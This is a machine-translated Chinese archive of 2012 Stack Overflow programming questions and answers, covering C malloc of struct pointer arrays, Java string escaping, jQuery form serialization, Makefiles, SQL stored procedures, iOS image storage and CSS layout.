> 赞同：4
> 
> 时间：2012-05-30T07:04:39.190

不，一般来说这不是真的。比较运算符需要评估它们的两侧，因此将常量放在左侧没有任何好处。但是将它们放在左侧（称为 Yoda 风格）可以减少语言中的编码错误，在这些语言中，您可以在条件中使用赋值运算符，并且您无意中将比较运算符错误地输入`==`为单个`=`:

```
// What you intended to write
if (a == 6) ...
// What you wrote instead
if (a = 6) ... // --> always true as the value of a is changed to 6
// What if Yoda style is used
if (6 = a) ... // --> compile time error 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T07:03:38.617

这是风格问题。有人喜欢写作

```
if (N == var) ... 
```

只是因为如果你错过了一个`=`（初学者的常见情况）

```
if (N = var) 
```

where`N`是常量，编译器会报错。

的情况下

```
if (var = N) 
```

它可能会给您一个警告，也可能不会（取决于编译器和标志）。所以有时很难找到问题所在。

两种变体的性能是相同的。选择你的风格并遵循它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:05:27.673

`Constant [Operator] Actual Value`被称为[尤达条件](http://united-coders.com/christian-harms/what-are-yoda-conditions)，因为它就像“如果它是蓝色的 - 这是天空”或“如果它很高 - 这是一个人”。

这种条件样式的使用在 C/C++ 中很流行，在这种情况下，您可以在键入时为变量赋值，`=`而不是`==`. 在 C# 中，使用 Yoda 条件是没有意义的。

我也怀疑它有更好的性能。即使它有一些性能优势，它也会非常小。匹配小于可读性的缺点。

# opencl - OpenCL 中的向量分量求和（类似 SSE）

> ID：10811413
> 
> 赞同：3
> 
> 时间：2012-05-30T06:59:12.523
> 
> 标签：opencl

是否有一条指令可以计算 a 的所有组件的总和`float4`，例如在 OpenCL 中？

```
float4 v;
float desiredResult = v.x + v.y + v.z + v.w; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T13:23:26.690

```
float4 v;
float desiredResult = dot(v, (float4)(1.0f, 1.0f, 1.0f, 1.0f)); 
```

这需要更多的工作，因为您在添加之前将每个组件乘以一个，但是有些 GPU 内置了点积指令。所以可能会更快；可能会慢一些。这取决于您的硬件。

# java - 将“\”替换为字符串

> ID：10811419
> 
> 赞同：0
> 
> 时间：2012-05-30T07:00:00.303
> 
> 标签：java, android

我有一个 URL 字符串

```
http:\/\/a0.twimg.com\/profile_images\/2170585961\/ETimes_normal.png 
```

我想替换`"\"`为，`""`但我使用：

```
String.replaceAll("\",""); 
```

它显示错误。我必须怎么做？

* * *

（从此[url](http://search.twitter.com/search.json?q=@android&rpp=25&page=1)键 profile_image_url 检索）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:02:11.027

改用[`String.replace(CharSequence, CharSequence)`](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#replace%28java.lang.CharSequence,%20java.lang.CharSequence%29)它，它会替换所有出现的事件！

```
str = str.replace("\\", ""); 
```

* * *

从你的例子：

```
String u = "http:\\/\\/a0.twimg.com\\/profile_images\\/2170585961\\/ETimes_normal.png";
System.out.println(u.replace("\\","")); 
```

输出：

```
http://a0.twimg.com/profile_images/2170585961/ETimes_normal.png 
```

* * *

*请注意，该[`String.replaceAll`](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#replaceAll%28java.lang.String,%20java.lang.String%29)方法采用正则表达式，在这种情况下您不需要它..*

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T07:02:27.157

用另一个反斜杠转义反斜杠：

```
String.replaceAll("\\\\",""); 
```

由于第一个参数是正则表达式，所以应该有两个反斜杠（`\`是正则表达式中的特殊字符）。但它也是一个字符串，所以每个反斜杠都应该被转义。所以有四个`\`s。

# c - 使用 Python 和共享库的复杂 Makefile

> ID：10811424
> 
> 赞同：0
> 
> 时间：2012-05-30T07:00:29.940
> 
> 标签：c, makefile, gnu-make

我几乎没有 Makefile 方面的经验，我正在努力学习——而且我了解其中的大部分内容。但是，我有一个这样的目录结构：

```
/src/
    /mysql/
        mp_mysql.h
        mp_mysql.c
    /sqlite/
        mp_sqlite.h
        mp_sqlite.c
/lib/
    mysql.so
    sqlite.so 
```

我正在尝试编写一个将文件编译`/src/mysql`成的makefile，`/lib/mysql.so`并对sqlite执行相同的操作。如果有人帮助我，我可能会得到它！谢谢！

PS 该项目是一个 Python 项目，我正在用 C 语言为 MySQL 编写一个特殊的适配器。我在网上找到的所有资源都无法开始工作和/或无法制作一个大型可执行文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:43:46.880

首先，为每个目录编写一个 Makefile 并定义一个 DIR_BUILD 变量，在调用`make`.

然后，编写一个运行每个子 Makefile 的项目 Makefile。

例如，

```
DIR_BUILD = '.'

mysql.so: mp_mysql.c mp_mysql.h
    gcc $< -o $(DIR_BUILD)/$@ 
```

并且，对于父 Makefile：

```
SUBDIRS = `find . -mindepth 1 -maxdepth 1 -type d`

all:
    for d in $(SUBDIRS);                               \
    do                                                 \
      $(MAKE) --directory=$$d DIR_BUILD=../lib;       \
    done 
```

没有担保人，让我知道情况如何！

# java - 安装第三个应用程序替换我在 android 中的第一个应用程序

> ID：10811425
> 
> 赞同：0
> 
> 时间：2012-05-30T07:00:35.187
> 
> 标签：java, android, android-layout

我有 3 个应用程序让我说 X1、Y1 和 Z1。现在安装两个应用程序 X1 和 Y1 是成功的，但是当我安装 Z1 时，它会替换我的 X1 应用程序。你们能在这个问题上帮助我吗？任何建议都会高度赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:38:59.037

[http://developer.android.com/guide/topics/manifest/manifest-intro.html](http://developer.android.com/guide/topics/manifest/manifest-intro.html)

读这个

它为应用程序命名 Java 包。包名称用作应用程序的唯一标识符。

# c# - 关于如何在 .NET WinForm 上记住以前用户选择的想法

> ID：10811426
> 
> 赞同：1
> 
> 时间：2012-05-30T07:00:35.143
> 
> 标签：c#, .net, winforms, visual-studio-2010

我目前正在寻找一种更好的方法来记住/保留 .NET Windows 窗体上控件的先前状态。

例如，Windows 窗体上有 5 个下拉列表菜单控件。并且用户之前在这些下拉菜单中选择了一些项目。我想在这里做的是：当再次加载这个 WinForm 时，用户之前的选择将被恢复并保持不变。

现在，我可以想到一个解决方案：将每个选定的值/索引存储在文本文件或注册表项或其他东西中。然后在每次加载 From 时读取它们。

但问题是这种方法在处理大量控件和维护它们的状态时会变得低效。

那么有人可以给我一些想法或建议吗？实现它的最佳方法是什么？

编辑：

我刚刚在 MSDN 上阅读了[这篇文章](http://msdn.microsoft.com/en-us/library/k4s6c3a0.aspx)，这让我很担心，因为我目前正在做插件项目：

> 您不能在托管 .NET Framework 的非托管应用程序中使用应用程序设置。设置在 Visual Studio 加载项、Microsoft Office 的 C++、Internet Explorer 中的控件托管或 Microsoft Outlook 加载项和项目等环境中不起作用。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T07:05:53.757

您可能想查看设置文件

[保存用户设置](http://www.codeproject.com/Tips/350010/Saving-User-Settings-in-Winform-Application)

```
private void UserSettingsDemo_Load(object sender, EventArgs e)
    {
        txtServer.Text = Settings.Default.ServerNameSetting;
        txtDatabase.Text = Settings.Default.DBNameSetting;
        txtPassword.Text = Settings.Default.PasswordSetting;
        txtUserId.Text = Settings.Default.UserIdSetting;
    }

    private void UserSettingsDemo_FormClosing(object sender, FormClosingEventArgs e)
    {
        Settings.Default.DBNameSetting = txtDatabase.Text;
        Settings.Default.UserIdSetting = txtUserId.Text;
        Settings.Default.PasswordSetting = txtPassword.Text;
        Settings.Default.ServerNameSetting = txtServer.Text;
        Settings.Default.Save();

    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T07:12:01.007

您是说在重新启动应用程序后保持控件的先前状态吗？在这种情况下，您可能别无选择，只能将所有更改写入配置文件中。

如果您尝试在不同的 winform 之间导航并希望保留更改，则可以实现控件的历史记录。像堆栈这样的数据结构应该可以解决问题，使用以下方法：

AddToHistory(控制控件)

RetrieveLastOpen()

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T08:34:25.390

据您所知，您到底想保存什么，可以使用 smth like

```
(foreach var child in MainForm.Children.OfType<ComboBox>)
{
    // Save properties of child into Dictionary<string, ComboBoxProperties>
} 
```

并且为了加载你会这样做

```
(foreach var child in MainForm.Children.OfType<ComboBox>)
{
    // Load properties of child from dictionary[child.Name]
} 
```

# three.js - 倒影中的立方体相机

> ID：10811431
> 
> 赞同：0
> 
> 时间：2012-05-30T07:01:10.753
> 
> 标签：three.js

大师

你能告诉我怎么做吗：[http ://www.novaui.com/dc/insphere.png](http://www.novaui.com/dc/insphere.png)

这是一个四面体，面相互反射，球也相互反射，我用立方体相机无法像图片一样，你能给我一些线索吗？

谢谢，

罗松

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-31T20:58:08.617

为此，您需要光线追踪。这是我们还不能轻易做到的事情。几周前，NVIDIA 在他们的新开普勒显卡演示中展示了一些实时光线追踪。

[http://www.youtube.com/watch?v=h5mRRElXy-w](http://www.youtube.com/watch?v=h5mRRElXy-w)

# asp.net - 用于通知我的移动应用程序的 tcp 套接字服务的实现

> ID：10811432
> 
> 赞同：0
> 
> 时间：2012-05-30T07:01:14.583
> 
> 标签：asp.net, sockets

我想在客户端创建一个套接字来监听来自服务器的通知。是否有任何可以在我的 asp.net 应用程序中使用的套接字服务器示例？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:15:19.403

Asp.net 是无状态的，除非您正在查看 Comet 之类的东西，否则您需要构建一个 Windows 服务或 Windows 应用程序来发布一个套接字端点？

如果没有进程或用户的干预，Asp.net 无法触发服务器事件。你能更好地描述你的要求吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-05T09:05:14.720

[https://github.com/SignalR/SignalR](https://github.com/SignalR/SignalR)是 Comet 的服务器端和客户端实现，它看起来是一个适合消息传递目的的解决方案，您尝试构建什么可能会更深入地了解合适的解决方案。

# javascript - 使用 serialize() 后如何从字符串中获取数据

> ID：10811436
> 
> 赞同：0
> 
> 时间：2012-05-30T07:01:28.400
> 
> 标签：javascript, jquery, forms, html

我有一个表单并通过这个 jquery 代码获取所有字段值

> `var adtitletoshow = $("#form_data").serialize();`

现在当我提醒`adtitletoshow`它的节目是这样的 -

```
&fomdata1=textone&fomdata2=texttwo&fomdata3=textthree&fomdata4=textfour&fomdata5=textfive 
```

现在，当我输入此代码时-

```
$("#previewdiv").text(adtitletoshow); 
```

它显示了整个数据字符串。但我只想在这个 div 中显示 fomdata3 文本。我怎么能做到这一点？或者他们是解析表单数据的另一个更好的解决方案，因为我必须生成表单数据的预览？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:11:36.740

只需将表单数据转换为数组，而不是字符串：

```
 var unindexed_array = $("#form_data").serializeArray();
 vat indexed_array = {};

 $.map(unindexed_array, function(n, i){
     indexed_array[n['name']] = n['value'];
 }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:04:55.027

```
var formdata3 = $('#form_data :input[name="fomdata3"]').val();
$("#previewdiv").text(formdata3); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:39:12.327

使用 serializeArray() 代替 serialize()。

```
var adtitletoshow = $("#form_data").serializeArray();
$.each(adtitletoshow, function(i, field){
  if( field.name == 'fomdata3'){
    $("#previewdiv").text(field.value);
    break;
    }
}); 
```

# iphone - 将图像存储到 sqlite 数据库中

> ID：10811437
> 
> 赞同：2
> 
> 时间：2012-05-30T07:01:32.903
> 
> 标签：iphone, database, image, sqlite, insert

我知道很多人都问过这个问题，关于“为什么使用 sqlite、使用 FMDB、核心数据”等有几个讨论和争论。在数据库中存储或插入图像。但请理解我的问题，我很非常习惯于 sqlite3，我无法使用核心数据或其他一些数据库。另外我正处于 iphone 技术的学习阶段。所以我请求提供一个只能处理 sqlite 的解决方案；）

抱歉，如果我的要求有任何错误！

我有一个文本字段，当输入字母（即来自联系人）时，我会显示带有建议的表格，比如我输入字母“L”、“Lakshaman Rao、Prasanna Lakshmi”、“Lokesh Sharan”等。

现在我正在尝试从各个联系人中获取相应的联系人图片。因此，我搜索了有关如何检索联系人图像的代码示例并实现了以下方式：

```
NSData *imgData = nil;
imgData = (NSData *)ABPersonCopyImageData(ref);
contactImage = [UIImage imageWithData:imgData]; 
```

[现在我在这里](https://stackoverflow.com/questions/2037432/saving-image-to-documents-directory-and-retrieving-for-email-attachment)和[那里](https://stackoverflow.com/questions/9479293/how-to-insert-image-in-sqlite-database-in-iphone)搜索了类似的问题，常见的答案是将图像保存在应用程序的文档目录中，而在数据库中只保存图像的路径。

因为在数据库中插入 blob 会使我们的数据库非常慢:(

但是我该怎么做。我无法正确理解链接中的代码片段，如何将 UIImage 类型的 contactImage 转换为 NSString 以便我可以将字符串插入到数据库表中记录为 VARCHAR 类型！

**编辑**

这是那里建议的代码：

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,     NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *getImagePath = [documentsDirectory stringByAppendingPathComponent:@"savedImage.png"];
UIImage *img = [UIImage imageWithContentsOfFile:getImagePath]; 
```

这是我实现的代码：

```
ABAddressBookRef addressBook = ABAddressBookCreate( );
CFArrayRef allPeople = ABAddressBookCopyArrayOfAllPeople( addressBook );
CFIndex nPeople = ABAddressBookGetPersonCount( addressBook );

 NSString *contactFirstName = nil;
 NSString *contactLastName = nil;
 NSString *fullName = nil;

    for ( int i = 0; i < nPeople; i++ )
    {
        ref = CFArrayGetValueAtIndex( allPeople, i );
        contactFirstName = [[[NSString alloc] initWithString:(NSString *)ABRecordCopyValue(ref, kABPersonFirstNameProperty)]autorelease];
        contactLastName = [[[NSString alloc] initWithString:(NSString *)ABRecordCopyValue(ref, kABPersonLastNameProperty)]autorelease];

        contactLastName = [NSString stringWithFormat:@" %@",contactLastName];
        fullName = [contactFirstName stringByAppendingString:contactLastName];

        [contactList addObject:fullName];
}

    NSData *imgData = nil;
    imgData = (NSData *)ABPersonCopyImageData(ref);
    contactImage = [UIImage imageWithData:imgData];  

    CFRelease(allPeople);
    CFRelease(addressBook); 
```

请帮帮我，在如何处理和继续处理这个问题上苦苦挣扎:(

提前谢谢大家:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T07:11:18.207

用于将图像保存到文档

```
- (void)saveImage:(UIImage *)image forPerson:(NSString *)fullName  {
    //  Make file name first
    NSString *filename = [fullName stringByAppendingString:@".png"]; // or .jpg

    //  Get the path of the app documents directory
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,     NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];

    //  Append the filename and get the full image path
    NSString *savedImagePath = [documentsDirectory stringByAppendingPathComponent:filename];

    //  Now convert the image to PNG/JPEG and write it to the image path
    NSData *imageData = UIImagePNGRepresentation(image);
    [imageData writeToFile:savedImagePath atomically:NO];   

    //  Here you save the savedImagePath to your DB
    ...
} 
```

所以，你以后可以通过

```
- (UIImage *)loadImage:(NSString *)filePath  {
    return [UIImage imageWithContentsOfFile:filePath];
} 
```

# c - malloc 结构指针数组

> ID：10811439
> 
> 赞同：17
> 
> 时间：2012-05-30T07:01:55.290
> 
> 标签：c, arrays, pointers, struct, malloc

我有以下结构：

```
typedef struct _chess {
   int **array;
   int size;
   struct _chess *parent;
} chess; 
```

我有：

```
typedef struct _chess *Chess; 
```

现在，我想创建一个动态长度数组来存储指向国际象棋结构的指针，所以我执行以下操作：

```
Chess array [] = malloc(size * sizeof(Chess)); 
```

这给了我一个错误：无效的初始化程序。

如果我放弃 [] 并这样做：

```
Chess array = malloc(size * sizeof(Chess)); 
```

它编译没有错误，但是当我尝试通过执行以下操作将此数组的元素设置为 NULL 时：

```
array[i]=NULL; 
```

我收到一个错误：从类型“void *”分配给类型“struct _chess”时类型不兼容</p>

知道我在做什么错吗？谢谢。

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-05-30T07:07:56.923

`array`是一个有点误导的名字。对于一个动态分配的指针数组，`malloc`将返回一个指向内存块的指针。您需要使用`Chess*`而不是`Chess[]`保存指向数组的指针。

```
Chess *array = malloc(size * sizeof(Chess));
array[i] = NULL; 
```

也许以后：

```
/* create new struct chess */
array[i] = malloc(sizeof(struct chess));

/* set up its members */
array[i]->size = 0;
/* etc. */ 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-05-30T07:20:13.153

There's a lot of `typedef` going on here. Personally I'm against "hiding the asterisk", i.e. `typedef`:ing pointer types into something that doesn't look like a pointer. In C, pointers are quite important and really affect the code, there's a lot of difference between `foo` and `foo *`.

Many of the answers are also confused about this, I think.

Your allocation of an array of `Chess` values, which are pointers to values of type `chess` (again, a *very* confusing nomenclature that I really can't recommend) should be like this:

```
Chess *array = malloc(n * sizeof *array); 
```

Then, you need to initialize the actual instances, by looping:

```
for(i = 0; i < n; ++i)
  array[i] = NULL; 
```

This assumes you don't want to allocate any memory for the instances, you just want an array of pointers with all pointers initially pointing at nothing.

If you wanted to allocate space, the simplest form would be:

```
for(i = 0; i < n; ++i)
  array[i] = malloc(sizeof *array[i]); 
```

See how the `sizeof` usage is 100% consistent, and *never* starts to mention explicit types. *Use* the type information inherent in your variables, and let the compiler worry about which type is which. Don't repeat yourself.

Of course, the above does a needlessly large amount of calls to `malloc()`; depending on usage patterns it might be possible to do all of the above with just one call to `malloc()`, after computing the total size needed. Then you'd still need to go through and initialize the `array[i]` pointers to point into the large block, of course.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T07:09:19.970

恕我直言，这看起来更好：

```
Chess *array = malloc(size * sizeof(Chess)); // array of pointers of size `size`

for ( int i =0; i < SOME_VALUE; ++i )
{
    array[i] = (Chess) malloc(sizeof(Chess));
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-06-13T12:17:57.043

I agree with @maverik above, I prefer not to hide the details with a typedef. Especially when you are trying to understand what is going on. I also prefer to see everything instead of a partial code snippet. With that said, here is a malloc and free of a complex structure.

The code uses the ms visual studio leak detector so you can experiment with the potential leaks.

```
#include "stdafx.h"

#include <string.h>
#include "msc-lzw.h"

#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h> 

// 32-bit version
int hash_fun(unsigned int key, int try_num, int max) {
    return (key + try_num) % max;  // the hash fun returns a number bounded by the number of slots.
}

// this hash table has
// key is int
// value is char buffer
struct key_value_pair {
    int key; // use this field as the key
    char *pValue;  // use this field to store a variable length string
};

struct hash_table {
    int max;
    int number_of_elements;
    struct key_value_pair **elements;  // This is an array of pointers to mystruct objects
};

int hash_insert(struct key_value_pair *data, struct hash_table *hash_table) {

    int try_num, hash;
    int max_number_of_retries = hash_table->max;

    if (hash_table->number_of_elements >= hash_table->max) {
        return 0; // FULL
    }

    for (try_num = 0; try_num < max_number_of_retries; try_num++) {

        hash = hash_fun(data->key, try_num, hash_table->max);

        if (NULL == hash_table->elements[hash]) { // an unallocated slot
            hash_table->elements[hash] = data;
            hash_table->number_of_elements++;
            return RC_OK;
        }
    }
    return RC_ERROR;
}

// returns the corresponding key value pair struct
// If a value is not found, it returns null
//
// 32-bit version
struct key_value_pair *hash_retrieve(unsigned int key, struct hash_table *hash_table) {

    unsigned int try_num, hash;
    unsigned int max_number_of_retries = hash_table->max;

    for (try_num = 0; try_num < max_number_of_retries; try_num++) {

        hash = hash_fun(key, try_num, hash_table->max);

        if (hash_table->elements[hash] == 0) {
            return NULL; // Nothing found
        }

        if (hash_table->elements[hash]->key == key) {
            return hash_table->elements[hash];
        }
    }
    return NULL;
}

// Returns the number of keys in the dictionary
// The list of keys in the dictionary is returned as a parameter.  It will need to be freed afterwards
int keys(struct hash_table *pHashTable, int **ppKeys) {

    int num_keys = 0;

    *ppKeys = (int *) malloc( pHashTable->number_of_elements * sizeof(int) );

    for (int i = 0; i < pHashTable->max; i++) {
        if (NULL != pHashTable->elements[i]) {
            (*ppKeys)[num_keys] = pHashTable->elements[i]->key;
            num_keys++;
        }
    }
    return num_keys;
}

// The dictionary will need to be freed afterwards
int allocate_the_dictionary(struct hash_table *pHashTable) {

    // Allocate the hash table slots
    pHashTable->elements = (struct key_value_pair **) malloc(pHashTable->max * sizeof(struct key_value_pair));  // allocate max number of key_value_pair entries
    for (int i = 0; i < pHashTable->max; i++) {
        pHashTable->elements[i] = NULL;
    }

    // alloc all the slots
    //struct key_value_pair *pa_slot;
    //for (int i = 0; i < pHashTable->max; i++) {
    //  // all that he could see was babylon
    //  pa_slot = (struct key_value_pair *)  malloc(sizeof(struct key_value_pair));
    //  if (NULL == pa_slot) {
    //      printf("alloc of slot failed\n");
    //      while (1);
    //  }
    //  pHashTable->elements[i] = pa_slot;
    //  pHashTable->elements[i]->key = 0;
    //}

    return RC_OK;
}

// This will make a dictionary entry where
//   o  key is an int
//   o  value is a character buffer
//
// The buffer in the key_value_pair will need to be freed afterwards
int make_dict_entry(int a_key, char * buffer, struct key_value_pair *pMyStruct) {

    // determine the len of the buffer assuming it is a string
    int len = strlen(buffer);

    // alloc the buffer to hold the string
    pMyStruct->pValue = (char *) malloc(len + 1); // add one for the null terminator byte
    if (NULL == pMyStruct->pValue) {
        printf("Failed to allocate the buffer for the dictionary string value.");
        return RC_ERROR;
    }
    strcpy(pMyStruct->pValue, buffer);
    pMyStruct->key = a_key;

    return RC_OK;
}

// Assumes the hash table has already been allocated.
int add_key_val_pair_to_dict(struct hash_table *pHashTable, int key, char *pBuff) {

    int rc;
    struct key_value_pair *pKeyValuePair;

    if (NULL == pHashTable) {
        printf("Hash table is null.\n");
        return RC_ERROR;
    }

    // Allocate the dictionary key value pair struct
    pKeyValuePair = (struct key_value_pair *) malloc(sizeof(struct key_value_pair));
    if (NULL == pKeyValuePair) {
        printf("Failed to allocate key value pair struct.\n");
        return RC_ERROR;
    }

    rc = make_dict_entry(key, pBuff, pKeyValuePair);  // a_hash_table[1221] = "abba"
    if (RC_ERROR == rc) {
        printf("Failed to add buff to key value pair struct.\n");
        return RC_ERROR;
    }

    rc = hash_insert(pKeyValuePair, pHashTable);
    if (RC_ERROR == rc) {
        printf("insert has failed!\n");
        return RC_ERROR;
    }

    return RC_OK;
}

void dump_hash_table(struct hash_table *pHashTable) {

    // Iterate the dictionary by keys
    char * pValue;
    struct key_value_pair *pMyStruct;
    int *pKeyList;
    int num_keys;

    printf("i\tKey\tValue\n");
    printf("-----------------------------\n");
    num_keys = keys(pHashTable, &pKeyList);
    for (int i = 0; i < num_keys; i++) {
        pMyStruct = hash_retrieve(pKeyList[i], pHashTable);
        pValue = pMyStruct->pValue;
        printf("%d\t%d\t%s\n", i, pKeyList[i], pValue);
    }

    // Free the key list
    free(pKeyList);

}

int main(int argc, char *argv[]) {

    int rc;
    int i;

    struct hash_table a_hash_table;
    a_hash_table.max = 20;   // The dictionary can hold at most 20 entries.
    a_hash_table.number_of_elements = 0;  // The intial dictionary has 0 entries.
    allocate_the_dictionary(&a_hash_table);

    rc = add_key_val_pair_to_dict(&a_hash_table, 1221, "abba");
    if (RC_ERROR == rc) {
        printf("insert has failed!\n");
        return RC_ERROR;
    }
    rc = add_key_val_pair_to_dict(&a_hash_table, 2211, "bbaa");
    if (RC_ERROR == rc) {
        printf("insert has failed!\n");
        return RC_ERROR;
    }
    rc = add_key_val_pair_to_dict(&a_hash_table, 1122, "aabb");
    if (RC_ERROR == rc) {
        printf("insert has failed!\n");
        return RC_ERROR;
    }
    rc = add_key_val_pair_to_dict(&a_hash_table, 2112, "baab");
    if (RC_ERROR == rc) {
        printf("insert has failed!\n");
        return RC_ERROR;
    }
    rc = add_key_val_pair_to_dict(&a_hash_table, 1212, "abab");
    if (RC_ERROR == rc) {
        printf("insert has failed!\n");
        return RC_ERROR;
    }
    rc = add_key_val_pair_to_dict(&a_hash_table, 2121, "baba");
    if (RC_ERROR == rc) {
        printf("insert has failed!\n");
        return RC_ERROR;
    }

    // Iterate the dictionary by keys
    dump_hash_table(&a_hash_table);

    // Free the individual slots
    for (i = 0; i < a_hash_table.max; i++) {
        // all that he could see was babylon
        if (NULL != a_hash_table.elements[i]) {
            free(a_hash_table.elements[i]->pValue);  // free the buffer in the struct
            free(a_hash_table.elements[i]);  // free the key_value_pair entry
            a_hash_table.elements[i] = NULL;
        }
    }

    // Free the overall dictionary
    free(a_hash_table.elements);

    _CrtDumpMemoryLeaks();
    return 0;
} 
```

# sql-server-2008 - 使用存储过程从选择中插入数据

> ID：10811441
> 
> 赞同：0
> 
> 时间：2012-05-30T07:01:57.373
> 
> 标签：sql-server-2008, sql-server-2005

我需要使用如下所示的存储过程将数据插入另一个表：

```
CREATE PROCEDURE T.countnum
AS
   Insert into T1 values(select count(*) from T.countTable) 
```

但它不起作用我看到了几个例子，但没有选择。有什么例子吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:07:26.613

```
use db;
CREATE PROCEDURE T.countnum
AS
Insert into T1 ([column_name])
select count(*) 
from T.countTable
go 
```

或者

```
use db;
CREATE PROCEDURE T.countnum
AS

declare @counting int

select @counting = count(*) 
from T.countTable

Insert into T1 ([column_name]) values (@counting)

go 
```

~~你应该指定要计数的列`select count(id) from T.countTable`~~

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:29:21.163

```
use db;
CREATE PROCEDURE T.countnum
AS
Insert into T1 values((select count(*) from T.countTable))
go 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:05:03.853

你可以试试：

```
Insert into T1(CountColumn) 
select count(*) from T.countTable 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:07:11.047

这是语法：

```
INSERT INTO MyTable  
(  
    Column1,  
    Column2  
)  
EXEC [dbo].[yourStoredProcName] 
```

# javascript - Javascript 中的基本三元到 if/then 转换

> ID：10811443
> 
> 赞同：1
> 
> 时间：2012-05-30T07:02:11.187
> 
> 标签：javascript

有人介意将这行三元代码转换为`if`/`then`语句吗？`if`我理解三元，但是当我转换为/时无法消除语法错误`then`。这是我必须借用的唯一作业，我想把它写成`if`/`then`以便我可以评论它并自己更好地理解它。

原来的：

```
return n == null || isNaN(n) ? 0 : n; 
```

我的尝试：

```
return n == null || if(isNaN(n)){return 0;}else{return n;} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:05:12.937

```
if (n == null || isNaN(n)) {
  return 0;
} else {
  return n;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:03:56.423

您必须移动`return`if 和 else 并为 if 和 else 单独设置一个：

```
if(n == null || isNaN(n)){
    return 0;
}else{
    return n;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:04:14.623

```
if (n == null || isNaN(n))
    return 0;
else 
    return n; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:04:41.873

这就是我认为它正在做的事情：

```
if (n == null || isNan(n))
   return 0;
else
   return n; 
```

`||`运算符的优先[级](https://developer.mozilla.org/en/JavaScript/Reference/Operators/Operator_Precedence)高于`?`运算符。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-30T07:15:17.083

你需要在这里应用一些[语法](https://developer.mozilla.org/en/JavaScript/Reference/#Statements)：

*   原行是一个语句：[return 关键字](https://developer.mozilla.org/en/JavaScript/Reference/Statements/return)和一个表达式，由一个[三元运算符](https://developer.mozilla.org/en/JavaScript/Reference/Operators/Conditional_Operator)组成。
*   预期结果应该是[if-else 语句](https://developer.mozilla.org/en/JavaScript/Reference/Statements/if...else)：条件执行语句块 - 返回语句。

其他四个答案给出了正确的源代码，我不想重复了。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-30T07:16:10.170

问题是 return 必须是它出现的任何行的第一个语句（根据 ECMA 规范）。

如果您首先添加括号，则代码更容易翻译（`n == null || (isNaN(n) ? 0 : n)`给出不同的结果并且不等同于 javascript 对未加括号的代码的默认解析）

```
return (n == null || isNaN(n)) ? 0 : n; 
```

这相当于

```
if (n == null || isNaN(n)) {
    return 0;
} else {
    return n;
} 
```

# compiler-construction - Embarcadero“条件定义”设置 - 有什么区别？

> ID：10811444
> 
> 赞同：0
> 
> 时间：2012-05-30T07:02:17.793
> 
> 标签：compiler-construction, c++builder-xe2

项目选项窗口中的这两个设置有什么区别？

![在此处输入图像描述](../Images/4020f4895e89e3de1cc263b046f90e2b.png)

![在此处输入图像描述](../Images/e2fcbbe149ca4977c421ba9778efe28a.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T21:32:41.037

第一个包含全局条件。第二个继承了全局条件，如果需要可以添加额外的条件。这只是在多个构建配置中共享通用条件的另一种方式。

# html - 如何在一行上显示三个文本字段

> ID：10811448
> 
> 赞同：0
> 
> 时间：2012-05-30T07:02:26.200
> 
> 标签：html, css

我试图在一行上显示三个文本字段。当屏幕较小时，这些文本字段应显示在同一行中。目前，当我将浏览器变小时，文本字段会移动到第二行。

我怎样才能做到这一点？

请看我的[代码](http://jsfiddle.net/6tkF8/)

**HTML**

```
<div class="fields">
    <input type="text" class="name" />
    <span>&ndash;</span>
    <input type="text" class="name" />
    <input type="text" class="name2" />
</div> 
```

**CSS**

```
.fields {
    border: 1px solid grey;
    width: 23%;
}
.name {
    display: inline;
    width: 11ex;
}
.name2 {
    display: inline;
    width: 8ex;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:03:41.470

给**空白：nowrap；**到你的`.fields`DIV。像这样写：

```
.fields {
            border: 1px solid grey;
            width: 23%;
            white-space:nowrap;
        } 
```

检查这个[http://jsfiddle.net/6tkF8/1/](http://jsfiddle.net/6tkF8/1/)

* * *

